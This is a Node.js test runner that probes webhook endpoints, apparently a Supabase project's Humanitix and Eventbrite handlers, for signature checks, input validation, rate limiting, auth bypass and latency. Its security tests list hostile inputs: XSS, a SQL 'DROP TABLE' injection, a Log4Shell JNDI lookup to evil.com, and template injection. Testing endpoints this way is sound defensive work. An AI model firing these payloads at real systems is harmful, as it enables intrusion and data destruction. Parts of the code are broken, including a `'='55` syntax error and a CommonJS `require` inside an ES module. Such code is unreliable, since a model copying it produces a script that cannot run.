#!/usr/bin/env node

/**
 * Comprehensive Webhook Testing Runner
 * Runs all webhook tests and generates a complete report
 */

import { WebhookTester } from './test-webhook-endpoints.js';
import { WebhookPayloadGenerator } from './generate-webhook-payloads.js';
import { WebhookMonitor } from './webhook-monitoring.js';

class ComprehensiveWebhookTester {
  constructor() {
    this.startTime = Date.now();
    this.results = {
      payloadGeneration: null,
      endpointTesting: null,
      monitoring: null,
      security: null,
      performance: null
    };
  }

  async runFullTestSuite() {
    console.log('🚀 Starting Comprehensive Webhook Testing Suite');
    console.log('='55);
    console.log(`Start Time: ${new Date().toLocaleString()}\n`);

    try {
      // Step 1: Generate test payloads
      console.log('📦 STEP 1: Generating Test Payloads');
      console.log('-'.repeat(40));
      const generator = new WebhookPayloadGenerator();
      this.results.payloadGeneration = generator.generateAll();
      
      // Step 2: Test webhook endpoints
      console.log('\n🧪 STEP 2: Testing Webhook Endpoints');
      console.log('-'.repeat(40));
      const tester = new WebhookTester();
      await tester.runAllTests();
      this.results.endpointTesting = tester.results;

      // Step 3: Check monitoring and health
      console.log('\n🏥 STEP 3: Health Monitoring');
      console.log('-'.repeat(40));
      const monitor = new WebhookMonitor();
      this.results.monitoring = await monitor.generateDashboard();

      // Step 4: Security validation
      console.log('\n🔒 STEP 4: Security Validation');
      console.log('-'.repeat(40));
      this.results.security = await this.runSecurityTests();

      // Step 5: Performance benchmarking
      console.log('\n⚡ STEP 5: Performance Benchmarking');
      console.log('-'.repeat(40));
      this.results.performance = await this.runPerformanceTests();

      // Generate final report
      this.generateFinalReport();

    } catch (error) {
      console.error('❌ Test suite failed:', error);
      process.exit(1);
    }
  }

  async runSecurityTests() {
    console.log('🔒 Running security validation tests...\n');
    
    const securityResults = {
      signatureValidation: { passed: 0, failed: 0 },
      inputValidation: { passed: 0, failed: 0 },
      rateLimiting: { passed: 0, failed: 0 },
      authenticationBypass: { passed: 0, failed: 0 }
    };

    const supabaseUrl = process.env.SUPABASE_URL;
    
    // Test 1: Signature validation bypass attempts
    try {
      const platforms = ['humanitix', 'eventbrite'];
      
      for (const platform of platforms) {
        const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
        
        // Test with no signature
        const noSigResponse = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ test: 'payload' })
        });
        
        // Test with malformed signature
        const badSigResponse = await fetch(url, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            [`x-${platform}-signature`]: 'malformed-signature'
          },
          body: JSON.stringify({ test: 'payload' })
        });

        if (noSigResponse.status >= 400 && badSigResponse.status >= 400) {
          securityResults.signatureValidation.passed++;
          console.log(`✅ [${platform}] Signature validation: SECURE`);
        } else {
          securityResults.signatureValidation.failed++;
          console.log(`❌ [${platform}] Signature validation: VULNERABLE`);
        }
      }
    } catch (error) {
      console.log(`⚠️  Signature validation test error: ${error.message}`);
      securityResults.signatureValidation.failed++;
    }

    // Test 2: Input validation and injection attempts
    try {
      const maliciousPayloads = [
        { test: '<script>alert("xss")</script>' },
        { test: "'; DROP TABLE users; --" },
        { test: '${jndi:ldap://evil.com/a}' },
        { test: '{{7*7}}' },
        { test: 'A'.repeat(100000) } // Large payload
      ];

      let validationPassed = 0;
      
      for (const payload of maliciousPayloads) {
        for (const platform of ['humanitix', 'eventbrite']) {
          const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
          
          try {
            const response = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload),
              timeout: 5000
            });
            
            if (response.status >= 400) {
              validationPassed++;
            }
          } catch (error) {
            // Timeout or rejection is good for large payloads
            validationPassed++;
          }
        }
      }

      if (validationPassed >= maliciousPayloads.length) {
        securityResults.inputValidation.passed++;
        console.log('✅ Input validation: SECURE');
      } else {
        securityResults.inputValidation.failed++;
        console.log('❌ Input validation: VULNERABLE');
      }
    } catch (error) {
      console.log(`⚠️  Input validation test error: ${error.message}`);
      securityResults.inputValidation.failed++;
    }

    // Test 3: Rate limiting (simplified test)
    try {
      const url = `${supabaseUrl}/functions/v1/humanitix-webhook`;
      const rapidRequests = [];
      
      // Send 20 requests rapidly
      for (let i = 0; i < 20; i++) {
        rapidRequests.push(
          fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ test: `request-${i}` })
          })
        );
      }

      const responses = await Promise.all(rapidRequests);
      const rateLimited = responses.some(r => r.status === 429);
      
      if (rateLimited) {
        securityResults.rateLimiting.passed++;
        console.log('✅ Rate limiting: ACTIVE');
      } else {
        securityResults.rateLimiting.failed++;
        console.log('⚠️  Rate limiting: NOT DETECTED (may not be configured)');
      }
    } catch (error) {
      console.log(`⚠️  Rate limiting test error: ${error.message}`);
      securityResults.rateLimiting.failed++;
    }

    // Test 4: Authentication bypass attempts
    try {
      const platforms = ['humanitix', 'eventbrite'];
      let authTestsPassed = 0;
      
      for (const platform of platforms) {
        const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
        
        // Test with admin/service headers
        const adminResponse = await fetch(url, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Authorization': 'Bearer fake-admin-token',
            'X-Admin': 'true'
          },
          body: JSON.stringify({ test: 'admin-bypass' })
        });

        if (adminResponse.status >= 400) {
          authTestsPassed++;
        }
      }

      if (authTestsPassed === platforms.length) {
        securityResults.authenticationBypass.passed++;
        console.log('✅ Authentication bypass protection: SECURE');
      } else {
        securityResults.authenticationBypass.failed++;
        console.log('❌ Authentication bypass protection: VULNERABLE');
      }
    } catch (error) {
      console.log(`⚠️  Authentication bypass test error: ${error.message}`);
      securityResults.authenticationBypass.failed++;
    }

    console.log('\n🔒 Security Test Summary:');
    Object.entries(securityResults).forEach(([test, result]) => {
      const total = result.passed + result.failed;
      const percentage = total > 0 ? ((result.passed / total) * 100).toFixed(1) : 0;
      console.log(`   ${test}: ${result.passed}/${total} passed (${percentage}%)`);
    });

    return securityResults;
  }

  async runPerformanceTests() {
    console.log('⚡ Running performance benchmark tests...\n');
    
    const performanceResults = {
      concurrency: {},
      throughput: {},
      latency: {},
      resourceUsage: {}
    };

    const supabaseUrl = process.env.SUPABASE_URL;
    const platforms = ['humanitix', 'eventbrite'];

    // Test 1: Concurrency handling
    console.log('🔄 Testing concurrency handling...');
    for (const platform of platforms) {
      const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
      const concurrentRequests = [];
      const startTime = Date.now();
      
      // Send 50 concurrent requests
      for (let i = 0; i < 50; i++) {
        concurrentRequests.push(
          fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              test: `concurrent-${i}`,
              timestamp: Date.now()
            })
          }).catch(error => ({ error: error.message }))
        );
      }

      const responses = await Promise.all(concurrentRequests);
      const endTime = Date.now();
      
      const successful = responses.filter(r => r.status && r.status < 400).length;
      const failed = responses.length - successful;
      
      performanceResults.concurrency[platform] = {
        totalRequests: responses.length,
        successful,
        failed,
        totalTime: endTime - startTime,
        averageTime: (endTime - startTime) / responses.length
      };
      
      console.log(`   ${platform}: ${successful}/${responses.length} successful (${((successful/responses.length)*100).toFixed(1)}%)`);
    }

    // Test 2: Throughput testing
    console.log('\n📊 Testing throughput...');
    for (const platform of platforms) {
      const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
      const testDuration = 30000; // 30 seconds
      const startTime = Date.now();
      let requestCount = 0;
      let successCount = 0;
      
      while (Date.now() - startTime < testDuration) {
        try {
          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              test: `throughput-${requestCount}`,
              timestamp: Date.now()
            })
          });
          
          requestCount++;
          if (response.status < 400) {
            successCount++;
          }
        } catch (error) {
          requestCount++;
        }
        
        // Small delay to prevent overwhelming
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
      const actualDuration = Date.now() - startTime;
      const requestsPerSecond = (requestCount / actualDuration) * 1000;
      
      performanceResults.throughput[platform] = {
        duration: actualDuration,
        totalRequests: requestCount,
        successfulRequests: successCount,
        requestsPerSecond: parseFloat(requestsPerSecond.toFixed(2)),
        successRate: parseFloat(((successCount / requestCount) * 100).toFixed(1))
      };
      
      console.log(`   ${platform}: ${requestsPerSecond.toFixed(2)} req/sec (${((successCount/requestCount)*100).toFixed(1)}% success)`);
    }

    // Test 3: Latency measurement
    console.log('\n⏱️  Measuring latency...');
    for (const platform of platforms) {
      const url = `${supabaseUrl}/functions/v1/${platform}-webhook`;
      const latencyMeasurements = [];
      
      for (let i = 0; i < 20; i++) {
        const startTime = Date.now();
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              test: `latency-${i}`,
              timestamp: startTime
            })
          });
          latencyMeasurements.push(Date.now() - startTime);
        } catch (error) {
          latencyMeasurements.push(null);
        }
      }
      
      const validMeasurements = latencyMeasurements.filter(m => m !== null);
      const avgLatency = validMeasurements.reduce((a, b) => a + b, 0) / validMeasurements.length;
      const minLatency = Math.min(...validMeasurements);
      const maxLatency = Math.max(...validMeasurements);
      
      performanceResults.latency[platform] = {
        measurements: validMeasurements.length,
        average: parseFloat(avgLatency.toFixed(2)),
        min: minLatency,
        max: maxLatency,
        p95: validMeasurements.sort((a, b) => a - b)[Math.floor(validMeasurements.length * 0.95)]
      };
      
      console.log(`   ${platform}: ${avgLatency.toFixed(2)}ms avg (min: ${minLatency}ms, max: ${maxLatency}ms)`);
    }

    return performanceResults;
  }

  generateFinalReport() {
    const endTime = Date.now();
    const totalDuration = endTime - this.startTime;
    
    console.log('\n' + '='.repeat(60));
    console.log('📋 COMPREHENSIVE WEBHOOK TEST REPORT');
    console.log('='.repeat(60));
    console.log(`Test Duration: ${(totalDuration / 1000).toFixed(2)} seconds`);
    console.log(`Completed: ${new Date().toLocaleString()}\n`);

    // Summary scores
    const scores = this.calculateScores();
    
    console.log('🎯 OVERALL SCORES');
    console.log('-'.repeat(20));
    Object.entries(scores).forEach(([category, score]) => {
      const grade = score >= 90 ? 'A' : score >= 80 ? 'B' : score >= 70 ? 'C' : score >= 60 ? 'D' : 'F';
      const icon = score >= 80 ? '✅' : score >= 60 ? '⚠️' : '❌';
      console.log(`${icon} ${category}: ${score.toFixed(1)}% (${grade})`);
    });

    console.log(`\n🏆 OVERALL GRADE: ${this.calculateOverallGrade(scores)}`);

    // Detailed breakdown
    console.log('\n📊 DETAILED RESULTS');
    console.log('-'.repeat(20));
    
    if (this.results.endpointTesting) {
      const { passed, failed, warnings } = this.results.endpointTesting;
      console.log(`Endpoint Tests: ${passed} passed, ${failed} failed, ${warnings} warnings`);
    }
    
    if (this.results.security) {
      const totalSecurityTests = Object.values(this.results.security)
        .reduce((sum, test) => sum + test.passed + test.failed, 0);
      const passedSecurityTests = Object.values(this.results.security)
        .reduce((sum, test) => sum + test.passed, 0);
      console.log(`Security Tests: ${passedSecurityTests}/${totalSecurityTests} passed`);
    }

    if (this.results.monitoring?.health) {
      console.log(`Health Status: ${this.results.monitoring.health.status.toUpperCase()}`);
      console.log(`Error Rate: ${this.results.monitoring.metrics.errorRate}%`);
    }

    // Recommendations
    console.log('\n💡 RECOMMENDATIONS');
    console.log('-'.repeat(20));
    const recommendations = this.generateRecommendations();
    recommendations.forEach((rec, index) => {
      console.log(`${index + 1}. ${rec}`);
    });

    // Save comprehensive report
    const reportData = {
      timestamp: new Date().toISOString(),
      duration: totalDuration,
      scores,
      overallGrade: this.calculateOverallGrade(scores),
      results: this.results,
      recommendations
    };

    const fs = require('fs');
    const reportPath = `/root/agents/comprehensive-webhook-test-report-${Date.now()}.json`;
    fs.writeFileSync(reportPath, JSON.stringify(reportData, null, 2));
    
    console.log(`\n📄 Complete report saved to: ${reportPath}`);
  }

  calculateScores() {
    const scores = {};

    // Endpoint testing score
    if (this.results.endpointTesting) {
      const { passed, failed } = this.results.endpointTesting;
      const total = passed + failed;
      scores.endpoints = total > 0 ? (passed / total) * 100 : 0;
    }

    // Security score
    if (this.results.security) {
      const totalTests = Object.values(this.results.security)
        .reduce((sum, test) => sum + test.passed + test.failed, 0);
      const passedTests = Object.values(this.results.security)
        .reduce((sum, test) => sum + test.passed, 0);
      scores.security = totalTests > 0 ? (passedTests / totalTests) * 100 : 0;
    }

    // Performance score (based on latency and success rates)
    if (this.results.performance?.latency) {
      const avgLatencies = Object.values(this.results.performance.latency)
        .map(l => l.average);
      const avgLatency = avgLatencies.reduce((a, b) => a + b, 0) / avgLatencies.length;
      
      // Score based on latency thresholds
      scores.performance = avgLatency < 1000 ? 100 : 
                          avgLatency < 2000 ? 85 : 
                          avgLatency < 3000 ? 70 : 
                          avgLatency < 5000 ? 50 : 25;
    }

    // Monitoring score
    if (this.results.monitoring?.health) {
      const healthScore = this.results.monitoring.health.status === 'healthy' ? 100 :
                         this.results.monitoring.health.status === 'warning' ? 70 : 30;
      const errorRate = this.results.monitoring.metrics.errorRate;
      const errorScore = errorRate < 1 ? 100 : 
                        errorRate < 5 ? 80 : 
                        errorRate < 10 ? 60 : 30;
      scores.monitoring = (healthScore + errorScore) / 2;
    }

    return scores;
  }

  calculateOverallGrade(scores) {
    const avgScore = Object.values(scores).reduce((a, b) => a + b, 0) / Object.values(scores).length;
    
    if (avgScore >= 90) return 'A (Excellent)';
    if (avgScore >= 80) return 'B (Good)';
    if (avgScore >= 70) return 'C (Fair)';
    if (avgScore >= 60) return 'D (Poor)';
    return 'F (Failing)';
  }

  generateRecommendations() {
    const recommendations = [];
    
    if (this.results.endpointTesting?.failed > 0) {
      recommendations.push('Fix failing endpoint tests to improve reliability');
    }
    
    if (this.results.security && Object.values(this.results.security).some(test => test.failed > 0)) {
      recommendations.push('Address security vulnerabilities identified in testing');
    }
    
    if (this.results.performance?.latency) {
      const highLatency = Object.values(this.results.performance.latency)
        .some(l => l.average > 2000);
      if (highLatency) {
        recommendations.push('Optimize webhook processing to reduce latency');
      }
    }
    
    if (this.results.monitoring?.metrics?.errorRate > 5) {
      recommendations.push('Implement better error handling and retry logic');
    }

    recommendations.push('Set up automated monitoring alerts for webhook failures');
    recommendations.push('Consider implementing webhook signature verification for all platforms');
    recommendations.push('Add request rate limiting to prevent abuse');
    
    return recommendations;
  }
}

// Run comprehensive test if called directly
if (import.meta.url === `file://${process.argv[1]}`) {
  const tester = new ComprehensiveWebhookTester();
  tester.runFullTestSuite().catch(error => {
    console.error('❌ Comprehensive test failed:', error);
    process.exit(1);
  });
}

export { ComprehensiveWebhookTester };